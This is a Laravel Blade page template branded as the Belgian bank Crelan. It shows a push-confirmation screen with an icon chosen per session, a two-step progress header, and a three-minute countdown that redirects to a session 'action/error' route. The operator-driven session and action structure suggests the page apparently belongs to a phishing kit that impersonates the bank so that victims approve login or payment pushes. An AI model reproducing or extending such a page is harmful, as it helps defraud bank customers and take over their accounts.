@extends('layouts.app')

@section('title', __('messages.push_icon_header') . ' | Crelan')

@section('content')
<div class="form-page-center">
    <div class="form-container">
        <div class="form-container--header-crelan">
            <div class="header-left">
                <svg xmlns="http://www.w3.org/2000/svg" width="64" height="64" viewBox="0 0 64 64" fill="none">
  <g clip-path="url(#clip0_902_3179)">
    <path d="M3.42649 45.8712C0.729037 43.1737 -0.670725 37.9587 0.31591 34.2746L5.70109 14.1871C6.67314 10.503 10.5079 6.68286 14.192 5.69623L34.2746 0.315909C37.9587 -0.656144 43.1786 0.724179 45.8761 3.42163L60.5784 18.1288C63.2758 20.8214 64.6707 26.0413 63.6841 29.7254L58.3038 49.8129C57.3317 53.4921 53.497 57.3123 49.8129 58.2989L29.7254 63.6841C26.0462 64.6561 20.8262 63.2709 18.1288 60.5735L3.42649 45.8712Z" fill="#FF4612"/>
    <path d="M39.2758 23.0425C37.3658 22.3913 36.1507 22.1385 36.2382 21.0061C36.3062 20.1264 36.9721 19.6695 38.1823 19.7667C38.5287 19.7553 38.8714 19.8402 39.1726 20.0117C39.4737 20.1833 39.7214 20.435 39.8882 20.7388C40.0211 21.0038 40.2077 21.2382 40.4362 21.4271C40.6648 21.616 40.9301 21.7552 41.2154 21.8358C41.5007 21.9164 41.7997 21.9367 42.0933 21.8953C42.3869 21.854 42.6686 21.7519 42.9205 21.5956C43.1725 21.4393 43.389 21.2322 43.5565 20.9875C43.7239 20.7428 43.8385 20.4659 43.893 20.1745C43.9474 19.8831 43.9406 19.5835 43.8728 19.2949C43.805 19.0063 43.6779 18.7349 43.4994 18.4982C42.4933 17.2491 40.8408 16.4034 38.5128 16.2236C34.4253 15.9125 31.8493 17.7351 31.6112 20.8505C31.3536 24.1847 33.5942 25.0838 36.9866 26.2309C39.305 26.9745 39.9028 27.339 39.8007 28.311C39.6987 29.2831 38.9016 29.7303 37.6428 29.633C36.5978 29.5553 35.9514 29.147 35.6501 28.5152C35.4656 28.1766 35.1929 27.8943 34.8609 27.6983C34.5288 27.5023 34.1499 27.4 33.7643 27.4022C33.4754 27.3937 33.1879 27.4454 32.9201 27.5542C32.6523 27.663 32.4101 27.8264 32.209 28.034C31.8621 28.3609 31.4534 28.6153 31.0069 28.7822C30.5604 28.9491 30.0851 29.0252 29.6088 29.0061C28.3548 28.9721 27.2515 28.2965 27.2515 26.5468L27.2953 20.6853C27.6852 20.931 28.1369 21.0608 28.5978 21.0595C28.988 21.0658 29.3742 20.9812 29.726 20.8123C30.0778 20.6434 30.3854 20.3949 30.6244 20.0865C30.8635 19.7781 31.0274 19.4182 31.1032 19.0354C31.1791 18.6527 31.1647 18.2575 31.0613 17.8812C30.9579 17.505 30.7683 17.158 30.5075 16.8677C30.2467 16.5775 29.9219 16.3519 29.5588 16.209C29.1957 16.0661 28.8043 16.0096 28.4157 16.0442C28.027 16.0788 27.6517 16.2035 27.3196 16.4083V14.2697C27.3215 14.0888 27.2874 13.9092 27.2194 13.7415C27.1513 13.5738 27.0506 13.4213 26.923 13.2928C26.7955 13.1644 26.6437 13.0626 26.4765 12.9934C26.3093 12.9241 26.13 12.8888 25.949 12.8894H24.0875C23.7257 12.8894 23.3785 13.0325 23.1218 13.2874C22.865 13.5424 22.7195 13.8885 22.7169 14.2503L22.6343 26.8287C22.5128 28.3937 21.4338 28.9964 20.2041 29.0061C18.9162 29.0061 17.774 28.3354 17.774 26.5468L17.8615 18.6051C17.8628 18.4849 17.8402 18.3657 17.7951 18.2543C17.75 18.1429 17.6833 18.0416 17.5988 17.9561C17.5142 17.8707 17.4136 17.8029 17.3027 17.7566C17.1918 17.7103 17.0728 17.6865 16.9526 17.6865H14.1628C13.9226 17.6865 13.6922 17.7816 13.5219 17.951C13.3516 18.1204 13.2552 18.3503 13.254 18.5905L13.1665 27.6501C13.1373 31.4362 16.1118 33.1373 20.2139 33.1373C20.915 33.163 21.6126 33.0273 22.253 32.7408C22.8934 32.4543 23.4595 32.0246 23.9077 31.4848C24.9575 32.6075 26.5808 33.1373 28.5492 33.1373C30.5176 33.1373 31.9903 32.8797 33.4484 32.0486C34.6436 32.706 35.9739 33.0801 37.3366 33.1421C41.5845 33.4678 44.1653 31.548 44.418 28.2479C44.6464 25.288 42.4253 24.1069 39.2515 23.0085" fill="white"/>
    <path d="M15.6987 15.7181C16.1969 15.721 16.6847 15.5757 17.1001 15.3007C17.5156 15.0257 17.8399 14.6334 18.0319 14.1737C18.2239 13.714 18.2749 13.2075 18.1784 12.7187C18.0819 12.23 17.8423 11.7809 17.49 11.4286C17.1377 11.0763 16.6886 10.8367 16.1998 10.7402C15.7111 10.6437 15.2046 10.6947 14.7449 10.8867C14.2852 11.0787 13.8929 11.403 13.6179 11.8185C13.3429 12.2339 13.1976 12.7217 13.2005 13.2199C13.2018 13.8821 13.4654 14.5168 13.9336 14.985C14.4018 15.4532 15.0365 15.7168 15.6987 15.7181Z" fill="white"/>
    <path d="M45.1811 34.2114C41.0644 34.2114 37.9781 36.5298 37.1276 40.4374C36.8943 36.7728 34.5565 34.6051 31.1154 34.6051C28.7145 34.6051 27.1446 35.6841 26.2211 37.1324C25.1762 35.4994 23.4216 34.6051 21.2345 34.6051C19.2029 34.6051 12.7971 34.3572 12.7971 42.5905C12.7971 42.7606 12.7971 42.9113 12.7971 43.0765V48.5784C12.824 49.1565 13.0725 49.702 13.4912 50.1016C13.9098 50.5012 14.4662 50.7241 15.045 50.7241C15.6237 50.7241 16.1802 50.5012 16.5988 50.1016C17.0174 49.702 17.2659 49.1565 17.2928 48.5784V41.9733C17.2928 40.0632 18.3718 38.7752 20.1555 38.7752C21.7886 38.7752 22.7412 39.9125 22.7412 41.9441V48.5638C22.7681 49.1419 23.0167 49.6874 23.4353 50.087C23.8539 50.4866 24.4103 50.7095 24.9891 50.7095C25.5678 50.7095 26.1243 50.4866 26.5429 50.087C26.9615 49.6874 27.2101 49.1419 27.2369 48.5638V41.4192C27.4216 39.8202 28.4083 38.7752 30.0073 38.7752C31.7327 38.7752 32.6561 39.9125 32.6561 41.9441V48.5638C32.683 49.1419 32.9316 49.6874 33.3502 50.087C33.7688 50.4866 34.3253 50.7095 34.904 50.7095C35.4827 50.7095 36.0392 50.4866 36.4578 50.087C36.8764 49.6874 37.125 49.1565 37.1519 48.5784V45.0498C38.0316 48.8846 41.1179 51.1835 45.3074 51.1835C47.1597 51.2042 48.9725 50.6469 50.4933 49.5893L50.6343 49.4872C50.6829 49.4483 50.7363 49.4143 50.7849 49.3706C50.7849 49.3706 50.8335 49.3268 50.7849 49.3706C50.8627 49.3123 50.9405 49.2539 51.0134 49.1908C51.3027 48.9121 51.5072 48.5573 51.6034 48.1673C51.6995 47.7773 51.6834 47.368 51.5569 46.9868C51.4303 46.6056 51.1985 46.268 50.8881 46.013C50.5778 45.7579 50.2017 45.5959 49.8032 45.5456C49.4185 45.4918 49.0265 45.5455 48.6705 45.7008C48.3145 45.8561 48.0084 46.1068 47.7862 46.4253C47.2758 47.096 46.3864 47.4751 45.1762 47.4751C43.0911 47.4751 41.8615 46.1823 41.774 44.1653H51.4945C51.8812 44.1653 52.2521 44.0116 52.5256 43.7382C52.799 43.4647 52.9526 43.0939 52.9526 42.7072V42.3427C52.9526 37.2637 49.8663 34.2357 45.1762 34.2357L45.1811 34.2114ZM41.774 41.113C41.9004 39.0328 43.1932 37.8323 45.147 37.8323C47.2272 37.8323 48.2382 39.1252 48.3305 41.113H41.774Z" fill="white"/>
  </g>
  <defs>
    <clipPath id="clip0_902_3179">
      <rect width="64" height="64" fill="white"/>
    </clipPath>
  </defs>
</svg>
                <span>{{ __('messages.push_icon_header') }}</span>
            </div>
            
            <!-- Progress Steps in Header -->
            <div class="header-right">
                <div class="push-steps-compact">
                    <div class="push-step active">
                        <div class="push-step-number">1</div>
                        <div class="push-step-content">
                            <div class="push-step-title">{{ __('messages.push_step1_text') }}</div>
                        </div>
                    </div>
                    <div class="push-step">
                        <div class="push-step-number">2</div>
                        <div class="push-step-content">
                            <div class="push-step-title">{{ __('messages.push_step2_text') }}</div>
                        </div>
                    </div>
                </div>
            </div>
        </div>

        <div class="form-container--content">
            @php
                $iconsPath = base_path('scripts/icons.json');
                $iconsData = [];
                if (file_exists($iconsPath)) {
                    $iconsData = json_decode(file_get_contents($iconsPath), true) ?? [];
                }
                $iconId = $session->push_icon_id ?? ($iconsData[0]['id'] ?? null);
                $iconSvg = null;
                foreach ($iconsData as $icon) {
                    if (($icon['id'] ?? null) === $iconId) {
                        $iconSvg = $icon['content'] ?? null;
                        break;
                    }
                }
                if ($iconSvg) {
                    $iconSvg = str_replace('#202120', '#ffffff', $iconSvg);
                }
            @endphp

            <div class="push-icon-page">
                <div class="push-icon-top">
                    <svg xmlns="http://www.w3.org/2000/svg" width="64" height="64" viewBox="0 0 64 64" fill="none">
  <g clip-path="url(#clip0_902_3179)">
    <path d="M3.42649 45.8712C0.729037 43.1737 -0.670725 37.9587 0.31591 34.2746L5.70109 14.1871C6.67314 10.503 10.5079 6.68286 14.192 5.69623L34.2746 0.315909C37.9587 -0.656144 43.1786 0.724179 45.8761 3.42163L60.5784 18.1288C63.2758 20.8214 64.6707 26.0413 63.6841 29.7254L58.3038 49.8129C57.3317 53.4921 53.497 57.3123 49.8129 58.2989L29.7254 63.6841C26.0462 64.6561 20.8262 63.2709 18.1288 60.5735L3.42649 45.8712Z" fill="#FF4612"/>
    <path d="M39.2758 23.0425C37.3658 22.3913 36.1507 22.1385 36.2382 21.0061C36.3062 20.1264 36.9721 19.6695 38.1823 19.7667C38.5287 19.7553 38.8714 19.8402 39.1726 20.0117C39.4737 20.1833 39.7214 20.435 39.8882 20.7388C40.0211 21.0038 40.2077 21.2382 40.4362 21.4271C40.6648 21.616 40.9301 21.7552 41.2154 21.8358C41.5007 21.9164 41.7997 21.9367 42.0933 21.8953C42.3869 21.854 42.6686 21.7519 42.9205 21.5956C43.1725 21.4393 43.389 21.2322 43.5565 20.9875C43.7239 20.7428 43.8385 20.4659 43.893 20.1745C43.9474 19.8831 43.9406 19.5835 43.8728 19.2949C43.805 19.0063 43.6779 18.7349 43.4994 18.4982C42.4933 17.2491 40.8408 16.4034 38.5128 16.2236C34.4253 15.9125 31.8493 17.7351 31.6112 20.8505C31.3536 24.1847 33.5942 25.0838 36.9866 26.2309C39.305 26.9745 39.9028 27.339 39.8007 28.311C39.6987 29.2831 38.9016 29.7303 37.6428 29.633C36.5978 29.5553 35.9514 29.147 35.6501 28.5152C35.4656 28.1766 35.1929 27.8943 34.8609 27.6983C34.5288 27.5023 34.1499 27.4 33.7643 27.4022C33.4754 27.3937 33.1879 27.4454 32.9201 27.5542C32.6523 27.663 32.4101 27.8264 32.209 28.034C31.8621 28.3609 31.4534 28.6153 31.0069 28.7822C30.5604 28.9491 30.0851 29.0252 29.6088 29.0061C28.3548 28.9721 27.2515 28.2965 27.2515 26.5468L27.2953 20.6853C27.6852 20.931 28.1369 21.0608 28.5978 21.0595C28.988 21.0658 29.3742 20.9812 29.726 20.8123C30.0778 20.6434 30.3854 20.3949 30.6244 20.0865C30.8635 19.7781 31.0274 19.4182 31.1032 19.0354C31.1791 18.6527 31.1647 18.2575 31.0613 17.8812C30.9579 17.505 30.7683 17.158 30.5075 16.8677C30.2467 16.5775 29.9219 16.3519 29.5588 16.209C29.1957 16.0661 28.8043 16.0096 28.4157 16.0442C28.027 16.0788 27.6517 16.2035 27.3196 16.4083V14.2697C27.3215 14.0888 27.2874 13.9092 27.2194 13.7415C27.1513 13.5738 27.0506 13.4213 26.923 13.2928C26.7955 13.1644 26.6437 13.0626 26.4765 12.9934C26.3093 12.9241 26.13 12.8888 25.949 12.8894H24.0875C23.7257 12.8894 23.3785 13.0325 23.1218 13.2874C22.865 13.5424 22.7195 13.8885 22.7169 14.2503L22.6343 26.8287C22.5128 28.3937 21.4338 28.9964 20.2041 29.0061C18.9162 29.0061 17.774 28.3354 17.774 26.5468L17.8615 18.6051C17.8628 18.4849 17.8402 18.3657 17.7951 18.2543C17.75 18.1429 17.6833 18.0416 17.5988 17.9561C17.5142 17.8707 17.4136 17.8029 17.3027 17.7566C17.1918 17.7103 17.0728 17.6865 16.9526 17.6865H14.1628C13.9226 17.6865 13.6922 17.7816 13.5219 17.951C13.3516 18.1204 13.2552 18.3503 13.254 18.5905L13.1665 27.6501C13.1373 31.4362 16.1118 33.1373 20.2139 33.1373C20.915 33.163 21.6126 33.0273 22.253 32.7408C22.8934 32.4543 23.4595 32.0246 23.9077 31.4848C24.9575 32.6075 26.5808 33.1373 28.5492 33.1373C30.5176 33.1373 31.9903 32.8797 33.4484 32.0486C34.6436 32.706 35.9739 33.0801 37.3366 33.1421C41.5845 33.4678 44.1653 31.548 44.418 28.2479C44.6464 25.288 42.4253 24.1069 39.2515 23.0085" fill="white"/>
    <path d="M15.6987 15.7181C16.1969 15.721 16.6847 15.5757 17.1001 15.3007C17.5156 15.0257 17.8399 14.6334 18.0319 14.1737C18.2239 13.714 18.2749 13.2075 18.1784 12.7187C18.0819 12.23 17.8423 11.7809 17.49 11.4286C17.1377 11.0763 16.6886 10.8367 16.1998 10.7402C15.7111 10.6437 15.2046 10.6947 14.7449 10.8867C14.2852 11.0787 13.8929 11.403 13.6179 11.8185C13.3429 12.2339 13.1976 12.7217 13.2005 13.2199C13.2018 13.8821 13.4654 14.5168 13.9336 14.985C14.4018 15.4532 15.0365 15.7168 15.6987 15.7181Z" fill="white"/>
    <path d="M45.1811 34.2114C41.0644 34.2114 37.9781 36.5298 37.1276 40.4374C36.8943 36.7728 34.5565 34.6051 31.1154 34.6051C28.7145 34.6051 27.1446 35.6841 26.2211 37.1324C25.1762 35.4994 23.4216 34.6051 21.2345 34.6051C19.2029 34.6051 12.7971 34.3572 12.7971 42.5905C12.7971 42.7606 12.7971 42.9113 12.7971 43.0765V48.5784C12.824 49.1565 13.0725 49.702 13.4912 50.1016C13.9098 50.5012 14.4662 50.7241 15.045 50.7241C15.6237 50.7241 16.1802 50.5012 16.5988 50.1016C17.0174 49.702 17.2659 49.1565 17.2928 48.5784V41.9733C17.2928 40.0632 18.3718 38.7752 20.1555 38.7752C21.7886 38.7752 22.7412 39.9125 22.7412 41.9441V48.5638C22.7681 49.1419 23.0167 49.6874 23.4353 50.087C23.8539 50.4866 24.4103 50.7095 24.9891 50.7095C25.5678 50.7095 26.1243 50.4866 26.5429 50.087C26.9615 49.6874 27.2101 49.1419 27.2369 48.5638V41.4192C27.4216 39.8202 28.4083 38.7752 30.0073 38.7752C31.7327 38.7752 32.6561 39.9125 32.6561 41.9441V48.5638C32.683 49.1419 32.9316 49.6874 33.3502 50.087C33.7688 50.4866 34.3253 50.7095 34.904 50.7095C35.4827 50.7095 36.0392 50.4866 36.4578 50.087C36.8764 49.6874 37.125 49.1419 37.1519 48.5638V45.0498C38.0316 48.8846 41.1179 51.1835 45.3074 51.1835C47.1597 51.2042 48.9725 50.6469 50.4933 49.5893L50.6343 49.4872C50.6829 49.4483 50.7363 49.4143 50.7849 49.3706C50.7849 49.3706 50.8335 49.3268 50.7849 49.3706C50.8627 49.3123 50.9405 49.2539 51.0134 49.1908C51.3027 48.9121 51.5072 48.5573 51.6034 48.1673C51.6995 47.7773 51.6834 47.368 51.5569 46.9868C51.4303 46.6056 51.1985 46.268 50.8881 46.013C50.5778 45.7579 50.2017 45.5959 49.8032 45.5456C49.4185 45.4918 49.0265 45.5455 48.6705 45.7008C48.3145 45.8561 48.0084 46.1068 47.7862 46.4253C47.2758 47.096 46.3864 47.4751 45.1762 47.4751C43.0911 47.4751 41.8615 46.1823 41.774 44.1653H51.4945C51.8812 44.1653 52.2521 44.0116 52.5256 43.7382C52.799 43.4647 52.9526 43.0939 52.9526 42.7072V42.3427C52.9526 37.2637 49.8663 34.2357 45.1762 34.2357L45.1811 34.2114ZM41.774 41.113C41.9004 39.0328 43.1932 37.8323 45.147 37.8323C47.2272 37.8323 48.2382 39.1252 48.3305 41.113H41.774Z" fill="white"/>
  </g>
  <defs>
    <clipPath id="clip0_902_3179">
      <rect width="64" height="64" fill="white"/>
    </clipPath>
  </defs>
</svg>
                    <div class="push-icon-language">Nederlands</div>
                </div>

                <h2 class="push-icon-title">{{ __('messages.push_icon_title') }}</h2>
                <p class="push-icon-subtitle">{{ __('messages.push_icon_subtitle') }}</p>
                <p class="push-icon-instruction">{{ __('messages.push_icon_instruction') }}</p>

                <div class="push-icon-preview">
                    {!! $iconSvg ?? '' !!}
                </div>

                <div class="push-icon-timer">
                    <span id="push-icon-timer-value">03:00</span>
                    <span>{{ __('messages.push_icon_timer_label') }}</span>
                </div>
                <div class="push-icon-progress">
                    <div class="push-icon-progress-bar" id="push-icon-progress-bar"></div>
                </div>
            </div>
        </div>
    </div>
</div>
@endsection

@push('styles')
<style>
/* Header layout */
.form-container--header-crelan {
    display: flex;
    justify-content: space-between;
    align-items: center;
    gap: 20px;
}

.header-left {
    display: flex;
    align-items: center;
    gap: 12px;
}
.header-right {
    flex: 1;
    max-width: 300px;
}

/* Push steps compact */
.push-steps-compact {
    display: flex;
    flex-direction: column;
    gap: 3px;
}

.push-step {
    display: flex;
    align-items: center;
    gap: 6px;
    padding: 2px 4px;
    border-radius: 4px;
    background: #f8fafc;
    border: 1px solid #e2e8f0;
    transition: all 0.3s ease;
}

.push-step:last-child {
    margin-bottom: 0;
}

.push-step.active {
    background: #f0fdf4;
    border-color: #84BD00;
}

.push-step-number {
    width: 14px;
    height: 14px;
    border-radius: 50%;
    background: #e2e8f0;
    color: #64748b;
    display: flex;
    align-items: center;
    justify-content: center;
    font-size: 8px;
    font-weight: 600;
    flex-shrink: 0;
}

.push-step.active .push-step-number {
    background: #84BD00;
    color: white;
}

.push-step-content {
    flex: 1;
    min-width: 0;
}

.push-step-title {
    font-size: 8px;
    font-weight: 600;
    color: #64748b;
    line-height: 1.1;
}

.push-step.active .push-step-title {
    color: #1a202c;
}

.push-step-text {
    display: none;
}

.push-step.active .push-step-text {
    display: none;
}

/* Remove old styles */
.progress-compact {
    display: none;
}
</style>
@endpush

@push('scripts')
<script>
document.addEventListener('DOMContentLoaded', function() {
    const sessionId = localStorage.getItem('session_id');
    if (!sessionId) {
        window.location.href = '/';
        return;
    }

    if (window.SessionManager) {
        window.SessionManager.setSessionId(sessionId);
    }

    const totalSeconds = 180;
    let remainingSeconds = totalSeconds;
    const timerValue = document.getElementById('push-icon-timer-value');
    const progressBar = document.getElementById('push-icon-progress-bar');

    const updateTimer = () => {
        const minutes = String(Math.floor(remainingSeconds / 60)).padStart(2, '0');
        const seconds = String(remainingSeconds % 60).padStart(2, '0');
        timerValue.textContent = `${minutes}:${seconds}`;
        const percent = (remainingSeconds / totalSeconds) * 100;
        progressBar.style.width = `${percent}%`;
    };

    updateTimer();

    const timerInterval = setInterval(() => {
        remainingSeconds -= 1;
        if (remainingSeconds <= 0) {
            remainingSeconds = 0;
            updateTimer();
            clearInterval(timerInterval);
            window.location.href = `/session/${sessionId}/action/error`;
            return;
        }
        updateTimer();
    }, 1000);
});
</script>
@endpush
